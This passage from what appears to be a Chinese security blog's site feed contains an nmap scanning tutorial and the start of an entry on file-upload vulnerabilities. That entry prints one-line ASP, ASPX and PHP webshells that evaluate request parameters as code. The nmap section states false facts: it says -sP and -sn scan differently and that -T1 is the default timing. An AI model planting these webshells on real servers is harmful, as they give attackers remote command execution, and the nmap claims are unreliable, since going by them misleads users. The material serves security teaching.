parameter variable">--quiet</span> 仅输出必要的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学算法安全 </tag>
            
            <tag> 哈希长度扩展攻击 </tag>
            
            <tag> md5哈希长度扩展攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap扫描器</title>
      <link href="/2022/12/31/gong-fang-gong-ju-ku/nmap/"/>
      <url>/2022/12/31/gong-fang-gong-ju-ku/nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><ul><li><p>扫描神器，效率比较高。</p></li><li><p>特点：跨平台，集成在kali中。</p></li><li><p>官网：nmap.org</p></li><li><p>书籍：《nmap渗透测试指南》</p></li></ul><h1 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h1><p>如果使用kali中的namp时，建议使用桥接，桥接方式可以让kali和宿主机同处于一个网络环境，NAT模式的话nmap的扫描流量需要宿主机进行转发，效率比较低。</p><h2 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h2><h3 id="2-1-1-ping扫描"><a href="#2-1-1-ping扫描" class="headerlink" title="2.1.1 ping扫描"></a>2.1.1 ping扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap CIDR网段 -sP/-sn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-sn VS -sP：</p><p><code>nmap -sP</code> 和 <code>nmap -sn</code> 都是用于网络扫描的工具，但它们在扫描行为和目的上有所不同：</p><ol><li><strong><code>nmap -sP</code> (Ping Scan)</strong>:<ul><li>这个选项用于执行 ICMP echo 请求（ping）来确定哪些主机是在线的。</li><li>它不会扫描任何端口，只是检查主机是否响应 ICMP 请求。</li><li>这个选项通常用于避免被目标主机的防火墙或入侵检测系统（IDS）注意到，因为它不发送任何端口扫描数据包。</li><li><code>-sP</code> 可以快速识别网络中活跃的主机，但不会提供关于开放端口或服务的信息。</li></ul></li><li><strong><code>nmap -sn</code> (No Port Scan)</strong>:<ul><li>这个选项用于执行主机发现，但不进行端口扫描。</li><li>与 <code>-sP</code> 类似，<code>-sn</code> 也会检查主机是否在线，但它使用的方法可能包括更广泛的协议，如 ARP 请求（在局域网中）或其他方法，而不是仅仅依赖于 ICMP。</li><li><code>-sn</code> 选项在某些情况下可以绕过某些类型的防火墙或 IDS，因为它不发送标准的端口扫描数据包。</li><li>与 <code>-sP</code> 一样，<code>-sn</code> 不会提供关于开放端口或服务的详细信息。</li></ul></li></ol><p><strong>主要区别</strong>:</p><ul><li><code>-sP</code> 主要依赖于 ICMP 来确定主机是否在线，而 <code>-sn</code> 可能使用多种方法，包括 ICMP，但不限于此。</li><li><code>-sP</code> 在某些情况下可能更容易被检测到，因为它发送的是标准的 ICMP 请求，而 <code>-sn</code> 可能使用更隐蔽的方法。</li><li>两者都不会扫描端口，因此不会显示开放端口或服务的信息。</li></ul><p><strong>使用场景</strong>:</p><ul><li>如果你只想快速检查网络中哪些主机是在线的，而不关心端口信息，<code>-sP</code> 或 <code>-sn</code> 都是合适的选择。</li><li>如果你在一个限制 ICMP 流量的环境中，或者需要更隐蔽的扫描，<code>-sn</code> 可能是更好的选择。</li></ul><p>在实际使用中，选择哪个选项取决于你的具体需求和网络环境。</p></blockquote><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2024-12-31%2013.42.56.png" alt="主机发现示例" style="zoom:35%;"><h2 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h2><h3 id="2-2-1-扫描某个主机"><a href="#2-2-1-扫描某个主机" class="headerlink" title="2.2.1 扫描某个主机"></a>2.2.1 扫描某个主机</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap IP <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认扫描top 1000 个端口。</p><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2024-12-31%2013.46.48.png" alt="主机端口扫描示例" style="zoom:35%;"><h3 id="2-2-2-端口参数配置"><a href="#2-2-2-端口参数配置" class="headerlink" title="2.2.2 端口参数配置"></a>2.2.2 端口参数配置</h3><p>-p 指定端口</p><p>eg：</p><ul><li><p>-p 80</p></li><li><p>-p 1-80</p></li><li><p>-p 90，3389，22，21</p></li><li><p>-p 1-80，3389，22</p></li><li><p>-p- ⇔ -p 1-65535</p></li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2024-12-31%2013.49.32.png" alt="-p 指定端口" style="zoom:35%;"><h3 id="2-2-3-扫描方式"><a href="#2-2-3-扫描方式" class="headerlink" title="2.2.3 扫描方式"></a>2.2.3 扫描方式</h3><h4 id="1）全连接扫描-sT"><a href="#1）全连接扫描-sT" class="headerlink" title="1）全连接扫描 -sT"></a>1）全连接扫描 -sT</h4><p>TCP 全连接扫描【-sT】【建立完整的三次握手过程】</p><p>wireshark抓包分析：</p><p>启动wireshark抓包，并扫描53端口：</p><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.40.24.png" alt="扫描目标的53端口" style="zoom:30%;"><p>过滤：</p><ul><li>端口开启的情况</li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.40.52.png" style="zoom:75%;"><p>首先完成三次握手。</p><ul><li>端口关闭的情况</li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.49.49.png" style="zoom:75%;"><h4 id="2）SYN-半连接扫描-sS"><a href="#2）SYN-半连接扫描-sS" class="headerlink" title="2）SYN 半连接扫描 -sS"></a>2）SYN 半连接扫描 -sS</h4><p>SYN 半连接扫描【-sS】 【只进行三次握手的前两步】</p><p>抓包分析：</p><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.54.25.png" style="zoom:35%;"><ul><li>端口开启的情况</li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.58.47.png" style="zoom:35%;"><p><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.58.26.png" style="zoom:75%;">【syn】【syn ack】【rst】</p><ul><li>端口关闭的情况</li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.57.23.png" style="zoom:35%;"><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.56.57.png" style="zoom:75%;"><p>​      【syn】【rst】</p><h4 id="3）隐蔽扫描"><a href="#3）隐蔽扫描" class="headerlink" title="3）隐蔽扫描"></a>3）隐蔽扫描</h4><p>【不适用与windows系统】【发送畸形的数据包】</p><ul><li>Null扫描 【-sN】【标志位全为0】</li></ul><blockquote><p><strong>Null扫描（-sN）</strong>：在这种扫描中，Nmap 发送一个没有设置任何标志位的TCP数据包。如果目标端口关闭，操作系统通常会回复一个带有RST（重置）标志位的TCP数据包。如果端口开放，根据TCP RFC，理论上不应该有任何响应，但有些系统可能会忽略这个规则并发送一个RST数据包。这种扫描方式相对隐蔽，因为它不发送标准的SYN或ACK数据包，可能会绕过一些简单的防火墙或入侵检测系统。</p></blockquote><ul><li>Xmas扫描【-sX】</li></ul><blockquote><p><strong>Xmas扫描（-sX）</strong>：这种扫描方式通过发送带有FIN、PSH和URG标志位的TCP数据包来探测端口状态。这三个标志位同时置位，就像点亮圣诞树上所有的灯一样，因此得名Xmas扫描。如果目标端口关闭，通常会收到一个RST响应。如果端口开放或被过滤，可能不会有任何响应，或者在某些情况下，可能会收到一个RST响应。这种扫描方式同样相对隐蔽，因为它不使用标准的TCP握手标志位。</p></blockquote><ul><li>FIN扫描【-sF】</li></ul><blockquote><p><strong>FIN扫描（-sF）</strong>：在FIN扫描中，Nmap 发送一个只设置FIN标志位的TCP数据包。如果目标端口关闭，会收到一个RST响应。如果端口开放，通常不会有任何响应。这种扫描方式的隐蔽性介于SYN扫描和Xmas/Null扫描之间，因为它只使用了一个非标准的标志位。</p></blockquote><p>这三种扫描方式被称为“秘密扫描”，因为它们旨在最大程度地降低被目标系统察觉的可能性。它们通过发送非标准的TCP数据包来探测端口状态，基于目标主机对这些异常数据包的不同响应来判断端口是否开放。这些扫描方式的目的在于尽量减少在目标主机上产生的日志信息，以及避免触发防火墙规则或入侵检测系统的警报。</p><h3 id="2-2-4-探测端口开放的服务及版本（-sV）"><a href="#2-2-4-探测端口开放的服务及版本（-sV）" class="headerlink" title="2.2.4 探测端口开放的服务及版本（-sV）"></a>2.2.4 探测端口开放的服务及版本（-sV）</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的 <target> 可以是单个 IP 地址、域名或者是一个 IP 地址范围。</target></p><blockquote><p>Nmap 的 <code>-sV</code> 参数用于进行服务版本检测。当你在扫描过程中使用这个参数时，Nmap 会尝试确定运行在目标端口上的服务的版本信息。这可以通过分析服务对探测请求的响应来实现，Nmap 会发送特定的数据包到目标端口，并根据服务的响应来识别版本。</p></blockquote><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2024-12-31%2014.05.32.png" style="zoom:50%;"><h3 id="2-2-5-端口的状态"><a href="#2-2-5-端口的状态" class="headerlink" title="2.2.5 端口的状态"></a>2.2.5 端口的状态</h3><h4 id="1）ClosedFiltered"><a href="#1）ClosedFiltered" class="headerlink" title="1）ClosedFiltered"></a>1）ClosedFiltered</h4><p>该状态用于Nmap不能确定端口是关闭的还是被过滤的。值得注意的是，它只可能出现在IPID Idle扫描中。</p><h4 id="2）filtered"><a href="#2）filtered" class="headerlink" title="2）filtered"></a>2）filtered</h4><p>前面讲到掌握一定安全技术的管理员会布置一个防火墙设备或者是通过设置路由器的规则阻止Nmap的扫描，【当Nmap遇到防火墙设备或是路由器规则的时候，Nmap的报文就会被过滤达到目标端口，这样就会使Nmap无法判断目标端口到底是否开放了。】出现被过滤现象并不代表一定是被某些专业的设备过滤了，也许是因为网络堵塞造成的，建议遇到被过滤状态时【分不同的时间段再次进行扫描】。</p><h4 id="3）closed"><a href="#3）closed" class="headerlink" title="3）closed"></a>3）closed</h4><p>当端口关闭的时候Nmap也可以轻而易举地将其检测出来，因为接受了Nmap的探测报文并作出了响应，当然，这也【不能忽略是管理员的一个欺骗攻击者的把戏】，如果发现没有开放的端口，可以等待一会再次扫描一下可能又呈现开放状态了。如果管理员掌握一定的安全技术，可能会使用防火墙对这些端口进行防护，不过，这并不会阻碍我们发现这个端口，【如果被未知或已知的防火墙阻挡访问目标端口，Nmap也会提示“我遇到了一些情况，好像被防火墙挡住了。】”</p><h4 id="4）Unfiltered"><a href="#4）Unfiltered" class="headerlink" title="4）Unfiltered"></a>4）Unfiltered</h4><p>未被过滤状态意味着【端口可以访问，但是Nmap并不能判断目标端口处于开放状态还是关闭状态】，这里需要重申的是目标端口是否可以访问与是否开放并无太大的联系，例如，关闭的端口也可以接受Nmap发出去的探测报文。需要注意的是，当我们【使用ACK扫描时才会呈现出这种状态】，这时我们可以换一种扫描方式去进行扫描，以便于进一步确认目标端口是否开放。</p><h4 id="5）OpenFiltered"><a href="#5）OpenFiltered" class="headerlink" title="5）OpenFiltered"></a>5）OpenFiltered</h4><p>开放还是过滤的，如果Nmap发出去的探测报文并没有得到目标端口的响应，那可能会是受到了某些专业设备的阻挡，但这也不是完全一个被过滤的状态，这时Nmap就会呈现出目标端口是开放还是被过滤的。出现这种状态【不妨换一种扫描方式】进一步确认目标端口是开放还是被过滤的。</p><h4 id="6）open"><a href="#6）open" class="headerlink" title="6）open"></a>6）open</h4><p>发现这一点是端口扫描工具的职责所在，每一个端口就可能会是一次被攻击成功的大门，管理员也不会将一个端口随便关闭，这会使合法用户产生不必要的麻烦。当我们使用Nmap进行端口扫描时，【如果端口状态为Open,说明此端口对外为开放状态】，确定为Open状态便于我们制定下一步的渗透计划。</p><h2 id="2-3-操作系统类型-（-O）"><a href="#2-3-操作系统类型-（-O）" class="headerlink" title="2.3 操作系统类型 （-O）"></a>2.3 操作系统类型 （-O）</h2><p> 操作系统类型 【不太准确】</p><p>Nmap 的 <code>-O</code> 参数用于进行操作系统检测。当你在扫描过程中使用这个参数时，Nmap 会尝试确定目标主机运行的操作系统。</p><p>Nmap 的操作系统检测功能非常强大，但需要注意的是，检测结果可能不是 100% 准确，因为操作系统的响应模式可能会因为网络设备、防火墙配置或操作系统的特定设置而变化。此外，一些高级用户或管理员可能会采取措施来混淆或伪装操作系统的识别，以提高安全性。</p><p>判断操作系统类型 需要综合手段。</p><h2 id="2-4-保存扫描结果-（oX-oN）"><a href="#2-4-保存扫描结果-（oX-oN）" class="headerlink" title="2.4 保存扫描结果 （oX /-oN）"></a>2.4 保存扫描结果 （oX /-oN）</h2><ul><li>【保存为xml格式，保存为txt格式】</li></ul><h2 id="2-5-全面扫描-（-A）"><a href="#2-5-全面扫描-（-A）" class="headerlink" title="2.5 全面扫描 （-A）"></a>2.5 全面扫描 （-A）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-A</span> <span class="token function">ip</span> <span class="token parameter variable">-oN</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Nmap 的 <code>-A</code> 参数是一个强大的选项，它代表“侵略性扫描”（Aggressive Scan）。使用 <code>-A</code> 参数时，Nmap 会同时进行多种类型的扫描，包括：</p><ol><li><strong>操作系统检测</strong>（-O）：尝试识别目标主机的操作系统类型和版本。</li><li><strong>服务版本检测</strong>（-sV）：确定运行在目标端口上的服务的版本信息。</li><li><strong>脚本扫描</strong>（–script）：执行一系列预定义的脚本，这些脚本可以用于自动化常见的渗透测试任务，如检测已知漏洞、服务配置问题等。</li><li><strong>traceroute</strong>：在识别目标主机上运行的服务及其版本信息时，Nmap 会执行 traceroute 来跟踪数据包的路由路径。</li></ol><p><code>-A</code> 参数的侵略性较高，因为它会进行更多的探测，这可能会在目标主机上产生更多的日志条目，从而提高被目标系统管理员察觉的风险。因此，在进行 <code>-A</code> 扫描时，应确保你有适当的授权，以避免违反法律法规或道德规范。</p><p>此外，<code>-A</code> 参数可以与其他参数结合使用，以进一步定制扫描行为。例如，<code>-p</code> 参数可以用来指定特定的端口范围，<code>-T</code> 参数可以用来调整扫描的速度（0-5，0 代表最慢，5 代表最快）。</p></blockquote><h2 id="2-6-指定强度"><a href="#2-6-指定强度" class="headerlink" title="2.6 指定强度"></a>2.6 指定强度</h2><p>-T0～5</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T4</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>在 Nmap 中，<code>-T</code> 参数用于控制扫描的速度和强度。这个参数的值从 0 到 5，每个值代表不同的扫描策略，影响扫描的隐蔽性和速度。以下是每个值的含义：</p><ol><li>**<code>-T0</code> (极慢，极隐蔽)**：这种模式下，Nmap 会使用最隐蔽的扫描技术，如 SYN 扫描（如果没有使用 <code>-Pn</code> 参数来禁用 ICMP 主机发现）。它可能会使用更多的系统资源来随机化和延迟探测，以减少被检测到的可能性。</li><li>**<code>-T1</code> (慢，隐蔽)**：这是默认的扫描速度，提供了一个平衡的扫描速度和隐蔽性。对于大多数日常扫描任务，这是一个很好的起点。</li><li>**<code>-T2</code> (中等速度，较少隐蔽)**：这种模式下，Nmap 会加快扫描速度，但可能会牺牲一些隐蔽性。这适用于当你需要在不太关注隐蔽性的情况下快速完成扫描时。</li><li>**<code>-T3</code> (快)**：在这个级别，Nmap 会进一步加快扫描速度，可能会产生更多的网络流量，从而更容易被网络监控系统检测到。</li><li>**<code>-T4</code> (非常快)**：这种模式下，Nmap 会尽可能快地发送探测数据包，牺牲隐蔽性以换取速度。这适用于当你需要快速扫描并且不太关心是否被发现时。</li><li>**<code>-T5</code> (最快)**：这是最快的扫描模式，Nmap 会以最快的速度发送探测数据包，几乎不考虑隐蔽性。这种模式可能会对网络性能产生较大影响，并且很容易被检测到。</li></ol></blockquote><h2 id="2-7-启动脚本扫描（-sC）"><a href="#2-7-启动脚本扫描（-sC）" class="headerlink" title="2.7 启动脚本扫描（-sC）"></a>2.7 启动脚本扫描（-sC）</h2><p>Nmap 的 <code>-sC</code> 参数用于启用脚本扫描。这个参数会告诉 Nmap 在发现开放端口后，自动运行一组默认的 NSE（Nmap Scripting Engine）脚本。这些脚本可以用于收集目标系统的各种信息，如服务的更多细节、潜在的安全漏洞、配置问题等。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sC</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的 <code>&lt;target&gt;</code> 可以是单个 IP 地址、域名或者是一个 IP 地址范围。</p><blockquote><p>NSE 脚本是 Nmap 的一个强大特性，它们可以扩展 Nmap 的功能，使其能够执行各种复杂的任务。例如，如果一个端口被识别为运行 Web 服务器，Nmap 可以运行特定的脚本来检查 Web 应用程序的安全问题，如常见的漏洞、错误的配置、服务的版本信息等。</p><p><code>-sC</code> 参数通常与其他参数一起使用，以提供更全面的扫描结果。例如，结合 <code>-sV</code> 参数可以同时进行服务版本检测和脚本扫描，而 <code>-p</code> 参数可以指定要扫描的端口范围。</p><p>需要注意的是，脚本扫描可能会比基本的端口扫描消耗更多的时间和资源，因为它涉及到对每个开放端口执行额外的脚本。此外，某些脚本可能会对目标系统产生额外的负载，因此在生产环境中使用时应谨慎。</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总之，Nmap（Network Mapper）是一款开源的网络探测和安全审计工具，广泛用于网络安全领域。它能够快速扫描网络，检测主机是否在线、开放的端口以及运行的服务和它们的版本。Nmap 提供了多种扫描技术，如SYN扫描、UDP扫描、操作系统检测、服务版本检测等。此外，它还支持脚本扫描，能够使用NSE（Nmap Scripting Engine）脚本进行更深入的分析，如检测漏洞、执行系统命令等。Nmap 的灵活性和强大功能使其成为网络安全专业人士和渗透测试人员的重要工具。使用时需确保有适当的授权，以避免违反法律法规。</p>]]></content>
      
      
      <categories>
          
          <category> 攻防工具库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防工具库 </tag>
            
            <tag> nmap </tag>
            
            <tag> 漏洞扫描 </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 端口扫描 </tag>
            
            <tag> 指纹探测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞基础</title>
      <link href="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/"/>
      <url>/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>如果网站提供文件上传功能，但是对用户上传的内容过滤不严格，导致用户可以上传任意文件甚至恶意文件， 包括恶意脚本文件、exe程序等，那么这个网站就存在文件上传漏洞。</p><h1 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h1><ul><li>1、服务器配置不当。</li><li>2、开放了文件上传功能，但是对上传的内容没有做限制。</li><li>3、限制不严格导致被绕过。</li></ul><h1 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h1><ul><li><p>任意文件上传：恶意脚本、程序等。</p></li><li><p>上传的可写目录也具有可执行权限，上传webshell导致网站沦陷。</p></li><li><p>通过其他漏洞提权，导致服务器沦陷，波及旁站。</p></li></ul><h1 id="四、webshell"><a href="#四、webshell" class="headerlink" title="四、webshell"></a>四、webshell</h1><h2 id="4-1-概念"><a href="#4-1-概念" class="headerlink" title="4.1 概念"></a>4.1 概念</h2><p>通过上传漏洞获得的网站后门，webshell也是一个命令解释器，继承web用户权限。本质上是一个可以在服务端运行的脚本文件。</p><h2 id="4-2-大马"><a href="#4-2-大马" class="headerlink" title="4.2 大马"></a>4.2 大马</h2><p>代码复杂，功能强大：文件管理、执行系统命令</p><p>⚠️：密码一般写在文件中</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.40.56.png" style="zoom:75%;"><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.42.41.png" alt="PHP 大马示例" style="zoom:75%;"><h2 id="4-3-小马"><a href="#4-3-小马" class="headerlink" title="4.3 小马"></a>4.3 小马</h2><h3 id="4-3-1-一句话木马"><a href="#4-3-1-一句话木马" class="headerlink" title="4.3.1 一句话木马"></a>4.3.1 一句话木马</h3><ul><li>asp</li></ul><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval&nbsp;request("x")%&gt;&nbsp;&lt;%execute&nbsp;request("x")%&gt;&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>aspx（ASP.NET）</li></ul><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%@&nbsp;Page&nbsp;Language="Jscript"%&gt;&lt;%eval(Request.Item["x"],"unsafe");%&gt;&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;%@ Page Language="Jscript"%&gt;：这行代码是一个指令，告诉ASP.NET页面，页面中的脚本应该使用JScript（也就是微软的JavaScript实现）来编写。这允许你在ASP.NET页面中使用JavaScript代码。&lt;%eval(Request.Item["x"],"unsafe");%&gt;：&lt;% ... %&gt;：这是ASP.NET中执行服务器端代码的语法。eval：这是一个JavaScript函数，它接受一个字符串参数，并尝试执行这个字符串作为代码。这是一个非常危险的函数，因为它可以执行任何JavaScript代码，包括恶意代码。Request.Item["x"]：这行代码从HTTP请求中获取名为"x"的项的值。这通常是一个查询字符串参数，例如在URL中 ?x=someValue。"unsafe"：这是eval函数的一个参数，指定了代码执行的上下文。在这种情况下，它允许代码在全局上下文中执行，这意味着它可以访问和修改全局变量。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【asp VS aspx】</p><pre class="line-numbers language-none"><code class="language-none">ASP（Active Server Pages）和ASP.NET（通常以文件扩展名.aspx表示）是微软开发的两种不同的服务器端脚本技术，用于创建动态网页。它们之间存在一些关键的区别：一、技术基础：ASP：基于VBScript或JavaScript，是一种较老的技术，运行在IIS（Internet Information Services）服务器上。ASP.NET：是.NET Framework的一部分，支持多种语言（如C#、VB.NET等），提供了更强大的功能和性能。二、执行模式：ASP：解释执行，每次请求页面时，服务器都会解释执行ASP代码。ASP.NET：编译执行，.aspx页面在第一次请求时被编译成中间语言（IL），然后由.NET运行时环境执行，这提供了更好的性能。三、开发环境：ASP：开发环境相对简单，通常使用文本编辑器和IIS。ASP.NET：提供了集成开发环境（IDE），如Visual Studio，支持代码提示、调试和其他高级功能。四、状态管理：ASP：状态管理较为有限，通常依赖于Cookies或隐藏表单字段。ASP.NET：提供了更丰富的状态管理选项，如ViewState、Session State、Cache等。五、安全性：ASP：安全性较低，容易受到脚本注入等攻击。ASP.NET：提供了更高级的安全特性，如输入验证、成员资格和角色管理。六、跨平台性：ASP：主要运行在Windows服务器上。ASP.NET：虽然主要也是在Windows上运行，但随着.NET Core的发展，ASP.NET Core已经支持跨平台运行。总的来说，ASP.NET是ASP的后继者，提供了更现代、更强大的Web开发功能。随着技术的发展，ASP.NET已经演进到ASP.NET Core，这是一个更轻量级、高性能、跨平台的框架。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php @eval($_REQUEST['cmd’]);?&gt;</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>jsp</li><li>jspx</li></ul><p>jSP和jspx的一句话木马比较复杂一些。</p><p>【jsp vs jspx】</p><pre class="line-numbers language-none"><code class="language-none">JSP（JavaServer Pages）和 JSPX 是 Java Web 开发中用于创建动态网页的技术。它们允许开发者在 HTML 页面中嵌入 Java 代码。以下是 JSP 和 JSPX 的主要区别：1、文件扩展名：JSP：文件通常以 .jsp 作为扩展名。JSPX：文件以 .jspx 作为扩展名。2、XML基础：JSP：不是基于 XML 的，这意味着在 JSP 文件中，HTML 标签不需要关闭，可以自由地混合 HTML 和 Java 代码。JSPX：基于 XML 的，要求页面必须符合 XML 的格式，所有的 HTML 标签都需要正确关闭，以确保文件在 XML 格式上是有效的。3、脚本元素：JSP：使用 &lt;% %&gt; 来嵌入 Java 代码，使用 &lt;%! %&gt; 来声明类级别的变量和方法，使用 &lt;%= %&gt; 来输出表达式的结果。JSPX：使用 &lt;jsp:scriptlet&gt; 来嵌入 Java 代码，使用 &lt;jsp:declaration&gt; 来声明方法，输出表达式的结果通常使用 JSPX 的标准动作 &lt;jsp:expression&gt;。4、标准动作和标签库：JSP：可以使用 JSP 标准标签库（JSTL）来增加功能，但需要手动添加标签库的指令。JSPX：天然支持 JSP 标准标签库，不需要额外的指令就可以使用 JSTL。5、配置和部署：JSP：在 web.xml 中配置 servlet 映射。JSPX：通常不需要在 web.xml 中进行额外的配置，因为它们是作为 JSP 的扩展。6、开发工具支持：JSP：大多数 Java IDE 和文本编辑器都支持 JSP 开发。JSPX：可能需要更高级的 IDE 支持，因为它是基于 XML 的。7、性能：JSP：在性能上可能略有优势，因为它们不需要遵循 XML 的严格格式。JSPX：由于 XML 的解析可能稍微慢一些，但这种差异通常可以忽略不计。8、可读性和维护性：JSPX：由于其 XML 基础，可以提供更好的可读性和维护性，特别是对于大型项目。在实际开发中，选择 JSP 还是 JSPX 通常取决于项目需求、团队偏好以及开发工具的支持。JSPX 提供了更严格的结构，有助于保持代码的整洁和一致性，而 JSP 则提供了更多的灵活性。随着 JavaServer Faces (JSF) 框架的流行，JSPX 也变得更加流行，因为 JSF 页面默认使用 .jspx 扩展名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">在Java Web开发中，如果后端文件以JSP或JSPX结尾，这通常意味着该Web系统可能是基于以下框架开发的：1、JavaServer Pages (JSP)：JSP是一种服务器端技术，允许开发者在HTML页面中嵌入Java代码。JSP文件通常用于生成动态Web内容。如果一个Web系统的后端文件以.jsp结尾，这可能表明它是一个传统的JSP应用。2、JavaServer Faces (JSF)：JSF是一个基于组件的Web应用框架，它使用JSPX文件作为其视图技术。JSPX文件是JSP的XML兼容版本，它们提供了更严格的格式，并且与JSF的组件模型紧密集成。如果后端文件以.jspx结尾，这可能意味着该系统使用了JSF框架。3、Spring MVC：虽然Spring MVC通常与Thymeleaf或Freemarker模板引擎一起使用，但它也可以与JSP或JSPX文件一起工作。在Spring MVC应用中，控制器会处理HTTP请求并返回一个视图名称，这个视图名称可以映射到一个JSP或JSPX页面。4、Struts：Struts是一个MVC框架，它也支持使用JSP和JSPX文件作为其视图层。在Struts应用中，JSP和JSPX文件用于展示数据和处理用户输入。5、其他Java EE技术：除了上述框架，还有其他Java EE技术可能使用JSP和JSPX文件，如EJB（Enterprise JavaBeans）。   需要注意的是，JSP和JSPX文件可以与多种Java Web框架一起使用，它们本身并不局限于特定的框架。开发者可以根据自己的需求和偏好选择合适的框架和技术栈。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-2-配合菜刀、蚁剑使用"><a href="#4-3-2-配合菜刀、蚁剑使用" class="headerlink" title="4.3.2 配合菜刀、蚁剑使用"></a>4.3.2 